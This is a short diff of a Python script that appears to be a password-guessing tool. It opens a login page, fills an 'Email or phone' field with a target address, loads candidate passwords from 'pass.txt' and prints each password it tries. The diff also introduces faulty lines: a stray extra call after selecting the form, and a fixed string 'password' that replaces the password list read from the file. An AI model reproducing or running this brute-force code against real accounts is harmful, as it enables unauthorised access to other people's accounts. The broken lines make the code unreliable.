@@ -65,7 +65,7 @@ while answer:
 
         responses = web.open(url)
 
-        web.select_form(nr=0)
+        web.select_form(nr=0)()
 
         web.form['Email or phone'] = mail
 
@@ -79,7 +79,7 @@ while answer:
 
         file=open('pass.txt','r')
         password = file.readlines()
-        Password = password("\n")
+        Password = ("password\n")
         
         print("[*] Seeking password:%s"% password)
         
